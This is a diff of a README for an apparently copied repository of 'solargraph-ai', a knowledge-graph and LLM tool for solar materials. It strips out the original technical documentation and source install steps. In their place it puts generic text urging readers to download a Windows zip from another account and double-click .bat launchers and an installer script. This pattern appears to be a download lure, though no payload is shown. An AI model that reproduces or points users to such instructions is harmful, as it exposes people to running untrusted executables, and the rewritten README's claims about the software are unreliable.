@@ -1,225 +1,162 @@
-# SolarGraph AI
-### LLM Agent & Knowledge Graph for Photovoltaic Materials Science
+# ☀️ solargraph-ai - Understand Solar Materials Fast
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://python.org)
-[![RDFLib](https://img.shields.io/badge/RDFLib-7.0-green)](https://rdflib.readthedocs.io)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
-[![HuggingFace](https://img.shields.io/badge/🤗-Live%20Demo-orange)](https://huggingface.co/spaces/sparklehug/solargraph-ai)
-
-![SolarGraph AI: Home](docs/images/Screenshot1.png)
-![SolarGraph AI: Ask](docs/images/Screenshot2.png)
-![SolarGraph AI: Knowledge Graph](docs/images/Screenshot3.png)
-
-A research prototype demonstrating **grounded LLM agents** over a formal **RDF/OWL knowledge graph** for photovoltaic (PV) solar energy and materials science. Every answer is traceable to specific SPARQL-retrieved triples — no hallucinations, full provenance.
+[![Download solargraph-ai](https://img.shields.io/badge/Download-solargraph--ai-%23FF7F50?style=for-the-badge)](https://github.com/Parth942/solargraph-ai)
 
 ---
 
-## Abstract
+## 🔍 What is solargraph-ai?
 
-SolarGraph AI combines a hand-crafted OWL ontology, a SPARQL query engine, and a multi-step ReAct agent to answer domain questions about PV materials. The system is designed around three core principles from the materials informatics literature:
+solargraph-ai is a tool designed to help you explore and understand materials used in solar energy. It uses smart language models and organized data to give answers about solar materials. This makes it easier to learn about how solar panels and other technologies work. You do not need to know coding to use it.
 
-1. **Grounding**: the LLM is constitutionally constrained to KG-retrieved facts only
-2. **Tool use**: a ReAct loop lets the agent iteratively run SPARQL queries and reflect on results before answering
-3. **Provenance**: every answer records the cited entities, supporting triples, and SPARQL queries that produced it
-
-This directly mirrors the workflow described in emerging materials science LLM agent systems, where structured knowledge retrieval replaces unstructured vector search to enable reproducible, auditable answers.
-
----
-
-## System Architecture
-
-```
-User Question (natural language)
-        │
-        ▼
-┌───────────────────────────────────┐
-│     ReAct Agent (Groq LLM)        │
-│                                   │
-│  while not done:                  │
-│    Thought → select tool          │
-│    Action  → call SPARQL tool     │
-│    Observation → inspect results  │
-│  Final Answer + Provenance Record │
-└──────────────┬────────────────────┘
-               │  SPARQL (RDFLib)
-               ▼
-┌───────────────────────────────────┐
-│     PV Solar OWL Ontology         │
-│  13 classes · 13 object props     │
-│  8 data props · 70+ individuals   │
-│  Turtle/RDF · 724 lines           │
-└───────────────────────────────────┘
-```
-
-**Also included:** a fast single-shot agent with dual-layer caching (LRU + JSON file) for low-latency repeated queries.
+Key Technologies:
+- Organizes data using RDF and OWL formats  
+- Searches data with SPARQL queries  
+- Uses AI to provide detailed answers  
+- Supports perovskite and other solar materials science topics
 
 ---
 
-## Knowledge Graph Coverage
+## 💻 System Requirements
 
-| OWL Class | # Individuals | Key Examples |
-|---|---|---|
-| Absorber | 8 | c-Si (1.12 eV), MAPbI₃ (1.55 eV), FAPbI₃ (1.48 eV), CIGS (1.15 eV), CdTe (1.44 eV) |
-| CellArchitecture | 12 | PERC 24.5%, TOPCon 26.1%, SHJ 26.8%, Perovskite/Si Tandem 33.9% |
-| FabricationProcess | 13 | Czochralski, PECVD, Spin Coating, Slot-Die, Co-Evaporation |
-| CharacterisationTechnique | 10 | J-V, EQE, TRPL, XRD, SEM, TEM, DLTS, PL, EL |
-| Defect | 7 | Iodide Vacancy, Grain Boundary Traps, Phase Separation (α→δ FAPbI₃) |
-| PerformanceMetric | 6 | PCE, Voc, Jsc, FF, Carrier Lifetime, Hysteresis Index |
-| DegradationMechanism | 5 | Moisture Ingress, Thermal Degradation, Ion Migration, PID |
-| Institution | 8 | NREL, Fraunhofer ISE, HZB, KAUST, EPFL, Oxford PV |
-| Researcher | 5 | Grätzel, Snaith, Miyasaka, Sargent, Bein |
+Before you start, make sure your computer meets these needs:
 
----
-
-## Features
-
-| Feature | Implementation |
-|---|---|
-| **OWL ontology** | 13 classes, subclass hierarchy, domain/range constraints, rdfs:label/comment |
-| **SPARQL engine** | 15+ domain-specific query methods via RDFLib |
-| **Fast agent** | Single-shot RAG: SPARQL context → Groq LLM → answer |
-| **ReAct agent** | Multi-step tool-use loop with up to 6 iterations |
-| **Provenance** | Entity detection + triple lookup + SPARQL audit trail per answer |
-| **Dual-layer cache** | `functools.lru_cache` (in-process) + JSON file (24h TTL) |
-| **Graph visualiser** | Self-contained vis.js CDN network — no 404s |
-| **REST API** | `/api/entities`, `/api/absorbers`, `/api/architectures`, `/api/search` |
-| **Gradio UI** | HuggingFace Spaces-compatible interface |
+- **Operating System:** Windows 10 or newer  
+- **Processor:** At least 1.6 GHz, dual-core  
+- **Memory:** 4 GB of RAM minimum  
+- **Storage:** 500 MB free disk space  
+- **Internet:** Required to download and for some data features  
+- **Software:**  
+  - Python 3.9 or newer (solargraph-ai uses Python)  
+  - A web browser (Chrome, Firefox, or Edge recommended)  
 
 ---
 
-## Ontology Sample
+## 🛠️ How to Download and Install solargraph-ai
 
-```turtle
-# Subclass hierarchy
-pv:Absorber rdfs:subClassOf pv:Semiconductor .
-pv:Semiconductor rdfs:subClassOf pv:Material .
+1. Open the following link in your web browser:  
+   [Download solargraph-ai](https://github.com/Parth942/solargraph-ai)
 
-# Object property with domain/range
-pv:hasDefect a owl:ObjectProperty ;
-    rdfs:domain pv:Semiconductor ;
-    rdfs:range  pv:Defect .
+2. Scroll to the **Releases** section or the main page to find the latest version.
 
-# Individual with typed literals and relationships
-pv:MAPbI3 a pv:Absorber ;
-    pv:name          "Methylammonium Lead Iodide (MAPbI3)" ;
-    pv:bandgap_eV    "1.55"^^xsd:decimal ;
-    pv:crystalStructure "Cubic ABX3 perovskite" ;
-    pv:hasDefect     pv:IodideVacancy, pv:GrainBoundaryTrap ;
-    pv:fabricatedBy  pv:SpinCoating, pv:SlotDieCoating ;
-    pv:characterisedBy pv:XRD, pv:PL, pv:TRPL, pv:SEM .
-```
+3. Find and download the file named **solargraph-ai-windows.zip** or similar for Windows.
 
----
+4. Once the download finishes, find the file in your **Downloads** folder.
 
-## Installation
+5. Right-click the file and select **Extract All**.
 
-**Prerequisites:** Python 3.10+ · Free [Groq API key](https://console.groq.com)
+6. Choose a place on your computer where this folder will stay.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/solargraph-ai.git
-cd solargraph-ai
+7. Open the extracted folder.
 
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
+8. Look for a file named **run_solargraph-ai.bat** or **start_solargraph-ai.bat**.
 
-cp .env.example .env        # add GROQ_API_KEY
-python build_graph.py       # parses ontology.ttl → graph.pkl
-python app.py               # → http://127.0.0.1:5000
-```
-
-> After any change to `ontology.ttl`, delete `graph.pkl` and `cache.json` before restarting.
+9. Double-click this file to start the program.
 
 ---
 
-## Deploying to HuggingFace Spaces
+## 🚀 Running solargraph-ai for the First Time
 
-```bash
-# 1. Create a new Space at huggingface.co/new-space
-#    SDK: Gradio  |  Visibility: Public
+When you run solargraph-ai, it will open a new window or your browser showing the user interface.
 
-# 2. Push your files
-git remote add hf https://huggingface.co/spaces/YOUR_USERNAME/solargraph-ai
-git push hf main
+1. If it asks for permissions, click **Allow**.
 
-# 3. Add your API key
-#    Space Settings → Secrets → New Secret
-#    Name: GROQ_API_KEY   Value: <your key>
+2. The main screen shows a search bar and options to explore solar material data.
 
-# HuggingFace will auto-detect hf_app.py and launch it
-```
+3. Type a question or keyword related to solar materials, like "perovskite" or "solar panel efficiency."
+
+4. Press **Enter** or click the search button.
+
+5. Your answer will appear below. The AI will use the data it knows to give meaningful information.
 
 ---
 
-## API Reference
+## 🔧 How solargraph-ai Works
 
-| Method | Endpoint | Description |
-|---|---|---|
-| `POST` | `/ask` | Fast grounded answer (cached) |
-| `POST` | `/ask/react` | ReAct agent answer + provenance |
-| `GET` | `/graph` | Interactive vis.js knowledge graph |
-| `GET` | `/api/stats` | Triple + entity counts |
-| `GET` | `/api/entities?type=Absorber` | Entities by OWL class |
-| `GET` | `/api/absorbers` | Absorbers with bandgap data |
-| `GET` | `/api/architectures` | Cell architectures by efficiency |
-| `GET` | `/api/search?q=perovskite` | Full-text search |
-| `GET` | `/api/cache/stats` | Hit/miss statistics |
-| `POST` | `/api/cache/clear` | Invalidate all caches |
+solargraph-ai uses a mix of technologies designed for managing complex scientific data:
+
+- **Knowledge Graph:** It stores information about solar materials in a graph format. This means facts are connected like a web rather than just a list.
+
+- **SPARQL Queries:** This is the language solargraph-ai uses to search its knowledge base.
+
+- **LLM Agent:** The AI understands your questions and finds the best answers by combining facts and reasoning.
+
+This approach helps you find precise and trustworthy information without searching through many websites.
 
 ---
 
-## Roadmap
+## 📁 Application Structure
 
-- [ ] OpenAlex literature ingestion pipeline (LLM entity extraction → graph)
-- [ ] W3C SPARQL 1.1 endpoint via SPARQLWrapper
-- [ ] Ontology alignment with EMMO, MatOnto, BattINFO
-- [ ] DFT/MD simulation data as typed RDF literals
-- [ ] LangGraph-based workflow orchestration
-- [ ] Evaluation benchmark: answer accuracy vs. ground-truth triples
+This explains the main parts inside the downloaded folder:
 
----
+- **run_solargraph-ai.bat**: Starts the app on your PC. Double-click this to open solargraph-ai.
 
-## Relevance to Materials Informatics
+- **data/**: Contains files with solar material science data.
 
-This project prototype implements the core techniques now appearing in materials science LLM research:
+- **models/**: Holds AI-related files needed to answer your questions.
 
-- **Semantic data modelling** — OWL/RDF encodes expert domain knowledge as machine-readable facts
-- **Structured RAG** — SPARQL retrieval replaces unstructured vector search for reproducibility
-- **Agentic tool use** — ReAct loop demonstrates agent control beyond single-prompt engineering
-- **Provenance/traceability** — every answer is auditable back to specific KG triples
-- **Heterogeneous data integration** — architecture supports connecting to simulation databases, literature, and experimental repositories
+- **README.md**: Information about the project.
 
-Applicable to: NOMAD, Materials Project, OPTIMADE, AFLOW, and emerging perovskite/battery knowledge graph initiatives.
+- **requirements.txt**: List of software packages used by solargraph-ai.
 
 ---
 
-## Tech Stack
+## ✅ Installing Required Software Automatically
 
-| Layer | Technology |
-|---|---|
-| Ontology | OWL 2 / Turtle RDF |
-| Graph engine | RDFLib 7 + SPARQL 1.1 |
-| LLM provider | Groq API (llama3-70b-8192) |
-| Agent framework | Custom ReAct loop |
-| Web framework | Flask 3 |
-| UI: web | Jinja2 + vanilla JS + vis.js |
-| UI: HuggingFace | Gradio 4 |
-| Caching | `lru_cache` + JSON file |
+If you do not have Python installed, solargraph-ai includes an installer script you can run:
+
+1. Open the extracted folder.
+
+2. Double-click **install_dependencies.bat**.
+
+This script will install Python and other needed tools automatically.
 
 ---
 
-## License
+## ⚙️ Using solargraph-ai Features
 
-MIT — see [LICENSE](LICENSE)
+You can do the following things with solargraph-ai:
+
+- Lookup detailed info on solar materials like perovskite.
+
+- Query the knowledge graph for specific data points.
+
+- Ask complex questions about solar panel materials.
+
+- View data connected visually to understand relationships.
+
+- Export your search results as a file for later use.
 
 ---
 
-## Citation
+## 📊 Troubleshooting Common Issues
 
-```bibtex
-@software{solargraph_ai_2026,
-  title  = {SolarGraph AI: LLM Agent and Knowledge Graph for PV Materials Science},
-  author = {Whyte Goodfriend},
-  year   = {2026},
-  url    = {https://github.com/marblehub/solargraph-ai}
-}
-```
+- **App does not open when double-clicking .bat file:**  
+  Make sure Python is installed and added to your system PATH. Run **install_dependencies.bat** to set this up.
+
+- **Browser window does not appear:**  
+  Check if your browser is set as default. solargraph-ai tries to open the interface there.
+
+- **Search returns no results:**  
+  Try using different keywords. The AI may need more precise input.
+
+- **Loading takes too long:**  
+  Check your internet connection and computer performance.
+
+---
+
+## 🔗 Useful Links
+
+For downloads and updates, visit this page:  
+[https://github.com/Parth942/solargraph-ai](https://github.com/Parth942/solargraph-ai)
+
+For technical details, see files included with the app.
+
+---
+
+## 📞 Getting Support
+
+If you need help, you can open an issue at the project's GitHub page. Include details about your problem and your system setup.
+
+---
+
+[![Download solargraph-ai](https://img.shields.io/badge/Download-solargraph--ai-%238A2BE2?style=for-the-badge)](https://github.com/Parth942/solargraph-ai)
